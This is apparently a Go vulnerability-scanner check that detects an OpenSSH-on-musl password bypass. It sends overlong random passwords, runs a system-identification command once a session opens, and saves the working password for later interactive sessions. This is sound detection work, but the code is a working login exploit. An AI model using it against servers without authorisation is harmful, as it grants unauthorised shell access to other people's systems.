package cmd

import (
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"net"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnSSHHole = "vuln-sshhole"

// OpenSSH sshd built against musl libc without PAM accepts any password of
// 257 to 1024 bytes for a valid user whose shadow field is "*" (sshhole, no
// CVE yet). A one-character field gives sys_auth_passwd() a NULL salt, so
// pick_salt() borrows the $5$/$6$ prefix of another account's hash. musl's
// SHA-256/512 crypt returns the string "*" for keys over 256 bytes, which
// matches the "*" field. sshd itself rejects passwords over 1024 bytes.
// OpenSSH 10.6p2 rejects short stored hashes before calling crypt(3), and
// distributions have backported that fix without changing the banner.
//
// The first password attempt on a connection always fails on musl, because
// pick_salt() calls getspnam() for every account and zeroes the hash it
// copies out of musl's static buffer, which sys_auth_passwd() still points
// at. pick_salt() caches the salt, so later attempts on the same connection
// compare against "*". The check therefore sends every password on one
// connection: a 256-byte control that musl still hashes normally and that
// must be rejected, then a 257-byte trigger and, only if that fails, a
// 1024-byte one. All three are random, so no real account matches. A second
// connection then confirms that the trigger password alone, resent once,
// opens a session, which is what interact and the session checks rely on.
//
// https://sshhole.com/

const sshholeControlLen = 256

var sshholeTriggerLens = []int{257, 1024}

// sshholeAuthTries is how often the cached credential sends the trigger
// password on one connection: once to prime pick_salt() and once to match "*".
const sshholeAuthTries = 2

const sshholeProofCommand = "id; uname -a; ls /lib/ld-musl-* 2>/dev/null; head -3 /etc/os-release 2>/dev/null"

// sshholeFixedVersion is the first OpenSSH release that rejects short
// password hashes; earlier releases are probed.
var sshholeFixedVersion = [3]int{10, 6, 2}

// sshholeVersionPattern matches an OpenSSH banner and captures the
// major, minor, and portable patch components.
var sshholeVersionPattern = regexp.MustCompile(`^SSH-(?:2\.0|1\.99)-OpenSSH_(\d+)(?:\.(\d+))?(?:p(\d+))?`)

var errSSHHoleControlAccepted = errors.New("control password accepted")

// sshholeVersion parses an OpenSSH server banner into major/minor/patch
// components. Non-OpenSSH banners and banners without a version number
// return false.
func sshholeVersion(version string) ([3]int, bool) {
	m := sshholeVersionPattern.FindStringSubmatch(version)
	if m == nil {
		return [3]int{}, false
	}
	var out [3]int
	for i := range 3 {
		if m[i+1] == "" {
			continue
		}
		n, err := strconv.Atoi(m[i+1])
		if err != nil {
			return [3]int{}, false
		}
		out[i] = n
	}
	return out, true
}

// sshholeVulnerableVersion reports whether the banner is an OpenSSH
// release older than the one that rejects short password hashes.
func sshholeVulnerableVersion(version string) bool {
	v, ok := sshholeVersion(version)
	if !ok {
		return false
	}
	for i := range 3 {
		if v[i] != sshholeFixedVersion[i] {
			return v[i] < sshholeFixedVersion[i]
		}
	}
	return false
}

// sshholeRandomPassword returns a random password of exactly n bytes
// with no NUL bytes, since sshd measures passwords with strlen().
func sshholeRandomPassword(n int) string {
	buff := make([]byte, n)
	_, _ = rand.Read(buff)
	return base64.RawURLEncoding.EncodeToString(buff)[:n]
}

// sshholePasswords returns the control password followed by the
// trigger passwords.
func sshholePasswords() []string {
	pws := []string{sshholeRandomPassword(sshholeControlLen)}
	for _, n := range sshholeTriggerLens {
		pws = append(pws, sshholeRandomPassword(n))
	}
	return pws
}

// sshholeAccepted reports whether the server accepted the password,
// including a partial success where the server still wants another method.
func sshholeAccepted(r ssh.ExpAuthResult) bool {
	return r == ssh.AuthResultSuccess || r == ssh.AuthResultPartialSuccess
}

// sshholeMaxAuthTries reports whether the server ended the connection
// because the attempt reached MaxAuthTries, which counts as a rejection.
func sshholeMaxAuthTries(err error) bool {
	return err != nil && strings.Contains(strings.ToLower(err.Error()), "too many authentication failures")
}

// sshholeClassify decides whether a run of password attempts (control
// first, then triggers in order) shows the bypass. It returns the index of
// the accepted trigger password, or -1 and the reason the run does not count.
func sshholeClassify(results []ssh.ExpAuthResult) (int, string) {
	if len(results) == 0 {
		return -1, "no password attempt completed"
	}
	if sshholeAccepted(results[0]) {
		return -1, fmt.Sprintf("the %d-byte control password was accepted, so the server accepts any password", sshholeControlLen)
	}
	for i := 1; i < len(results); i++ {
		if sshholeAccepted(results[i]) {
			return i, ""
		}
	}
	if len(results) < 1+len(sshholeTriggerLens) {
		return -1, fmt.Sprintf("disconnected after %d of %d password attempts were rejected", len(results), 1+len(sshholeTriggerLens))
	}
	return -1, "every trigger password was rejected"
}

// sshholeAuthMethod returns a password method that resends the trigger
// password on the same connection. attempts, when set, counts the sends.
func sshholeAuthMethod(password string, attempts *int) ssh.AuthMethod {
	cb := ssh.PasswordCallback(func() (string, error) {
		if attempts != nil {
			*attempts++
		}
		return password, nil
	})
	return ssh.RetryableAuthMethod(cb, sshholeAuthTries)
}

// sshholeExecRan reports whether an exec request completed on the
// session. A remote exit status (zero or not) and a channel that closed
// without sending one both mean the command was accepted and ran.
func sshholeExecRan(err error) (string, bool) {
	if err == nil {
		return "0", true
	}
	if exitErr, ok := errors.AsType[*ssh.ExitError](err); ok {
		return strconv.Itoa(exitErr.ExitStatus()), true
	}
	if _, ok := errors.AsType[*ssh.ExitMissingError](err); ok {
		return "", true
	}
	return "", false
}

// sshholeSessionHandler runs the proof command on the opened session.
func sshholeSessionHandler(options *auth.Options) auth.SessionHandler {
	return func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, res *auth.AuthResult) error {
		_ = c.SetDeadline(time.Now().Add(options.Timeout * 3))
		out, err := ses.CombinedOutput(sshholeProofCommand)
		res.SessionOutput = auth.CleanSessionOutput(out)
		status, ran := sshholeExecRan(err)
		if !ran {
			return err
		}
		res.ExitStatus = status
		return nil
	}
}

func sshCheckVulnSSHHole(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnSSHHole
	if !conf.IsCheckEnabled(tname) {
		return nil
	}
	if !root.SupportsAuth("password") {
		return nil
	}
	if !sshholeVulnerableVersion(root.Version) {
		conf.Logger.Debugf("%s %s skipped: server version %q is not a vulnerable OpenSSH release", addr, tname, root.Version)
		return nil
	}

	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)

	passwords := sshholePasswords()
	var results []ssh.ExpAuthResult

	// Send the control and trigger passwords on one connection, stopping at the first accepted one.
	handler := func(uac *ssh.UnauthClientConn, extensions map[string][]byte, res *auth.AuthResult) error {
		results = results[:0]
		for i, pw := range passwords {
			ares, methods, err := uac.Authenticate(ssh.Password(pw), extensions)
			if err != nil {
				if sshholeMaxAuthTries(err) {
					results = append(results, ssh.AuthResultFailure)
				}
				return err
			}
			results = append(results, ares)
			res.Result = ares.String()
			res.Methods = methods
			if !sshholeAccepted(ares) {
				continue
			}
			if i == 0 {
				return errSSHHoleControlAccepted
			}
			if ares != ssh.AuthResultSuccess {
				return fmt.Errorf("authentication incomplete: %s", ares)
			}
			return nil
		}
		return fmt.Errorf("authentication failed: %s", res.Result)
	}

	res := auth.SSHAuth(addr, options.WithSessionHandler(sshholeSessionHandler(options)), handler)

	idx, reason := sshholeClassify(results)
	if idx < 0 {
		// OpenSSH 9.8+ PerSourcePenalties refuses a source after repeated failed logins.
		if strings.Contains(res.Error, "Not allowed at this time") {
			conf.Logger.Warnf("%s %s could not test user %s, the server is refusing this source (PerSourcePenalties): %s", addr, tname, options.Username, res.Error)
			return nil
		}
		conf.Logger.Debugf("%s %s not vulnerable for user %s: %s (stage %s: %v)", addr, tname, options.Username, reason, res.Stage, res.Error)
		return nil
	}
	trigger := passwords[idx]

	// Confirm that the trigger password alone opens a session on a fresh
	// connection, since interact and the session checks re-authenticate with
	// SessionAuth and nothing else.
	attempts := 0
	again := auth.SSHAuth(addr, options.WithSessionHandler(sshholeSessionHandler(options)), auth.SSHAuthHandlerSingle(sshholeAuthMethod(trigger, &attempts)))
	reusable := again.Stage == "session"

	conf.Logger.Warnf("%s %s accepted a %d-byte random password for user %s", addr, tname, len(trigger), options.Username)

	proof := fmt.Sprintf("%s accepted a %d-byte random password for user %s (%s) after rejecting a %d-byte control password on the same connection.",
		res.Version, len(trigger), options.Username, results[idx], sshholeControlLen)
	if res.Stage == "session" && res.Error == "" {
		proof += fmt.Sprintf(" Output of %q: %s", sshholeProofCommand, res.SessionOutput)
	} else {
		proof += fmt.Sprintf(" No command ran on that connection (stage %s: %s).", res.Stage, res.Error)
	}
	if reusable {
		proof += fmt.Sprintf(" A fresh connection opened a session with the %d-byte password on attempt %d.", len(trigger), attempts)
	} else {
		proof += fmt.Sprintf(" A fresh connection did not open a session with the %d-byte password after %d attempts (stage %s: %s).", len(trigger), attempts, again.Stage, again.Error)
	}

	root.AddVuln(auth.VulnResult{
		ID:    tname,
		Ref:   "https://sshhole.com/",
		Proof: proof,
	})
	root.SessionOutput = res.SessionOutput
	root.ExitStatus = res.ExitStatus
	if root.SessionOutput == "" {
		root.SessionOutput = again.SessionOutput
		root.ExitStatus = again.ExitStatus
	}

	if !reusable {
		res.SessionMethod = ""
		return res
	}
	res.SessionMethod = tname
	root.SessionMethod = tname
	root.SessionSecret = trigger
	root.SessionAuth = sshholeAuthMethod(trigger, nil)
	return res
}
